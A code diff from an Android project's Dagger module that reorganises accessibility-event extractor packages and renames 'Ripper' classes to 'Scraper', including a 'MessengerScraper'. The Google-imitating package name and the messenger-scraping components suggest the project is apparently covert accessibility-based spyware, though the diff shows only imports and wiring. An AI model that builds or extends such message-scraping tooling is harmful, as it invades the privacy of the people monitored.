@@ -9,20 +9,20 @@ import dagger.Provides;
 import service.android.google.com.accessibility.AS;
 import service.android.google.com.accessibility.controller.AccessibilityServiceController;
 import service.android.google.com.accessibility.controller.AccessibilityServiceControllerImpl;
+import service.android.google.com.accessibility.extractor.EventExtractor;
+import service.android.google.com.accessibility.extractor.extractors.Extractor;
+import service.android.google.com.accessibility.extractor.extractors.NotificationStateChangedExtractor;
+import service.android.google.com.accessibility.extractor.extractors.ViewClickedExtractor;
+import service.android.google.com.accessibility.extractor.extractors.ViewFocusedExtractor;
+import service.android.google.com.accessibility.extractor.extractors.ViewTextChangedExtractor;
+import service.android.google.com.accessibility.extractor.extractors.WindowStateChangedExtractor;
 import service.android.google.com.accessibility.model.PackageConstants;
 import service.android.google.com.accessibility.rx.ObservableFactory;
 import service.android.google.com.accessibility.rx.ObserverFactory;
-import service.android.google.com.accessibility.util.extractor.EventExtractor;
-import service.android.google.com.accessibility.util.extractor.extractors.Extractor;
-import service.android.google.com.accessibility.util.extractor.extractors.NotificationStateChangedExtractor;
-import service.android.google.com.accessibility.util.extractor.extractors.ViewClickedExtractor;
-import service.android.google.com.accessibility.util.extractor.extractors.ViewFocusedExtractor;
-import service.android.google.com.accessibility.util.extractor.extractors.ViewTextChangedExtractor;
-import service.android.google.com.accessibility.util.extractor.extractors.WindowStateChangedExtractor;
+import service.android.google.com.accessibility.scraper.WindowRipper;
+import service.android.google.com.accessibility.scraper.scrapers.MessengerScraper;
+import service.android.google.com.accessibility.scraper.scrapers.Scraper;
 import service.android.google.com.accessibility.util.function.FunctionFactory;
-import service.android.google.com.accessibility.util.ripper.WindowRipper;
-import service.android.google.com.accessibility.util.ripper.rippers.MessengerRipper;
-import service.android.google.com.accessibility.util.ripper.rippers.Ripper;
 
 import static java.util.Arrays.asList;
 
@@ -73,8 +73,8 @@ public class AccessibilityModule {
 
     @Provides
     WindowRipper windowRipper() {
-        return new WindowRipper(Arrays.<Ripper>asList(
-                new MessengerRipper()
+        return new WindowRipper(Arrays.<Scraper>asList(
+                new MessengerScraper()
         ));
     }
 
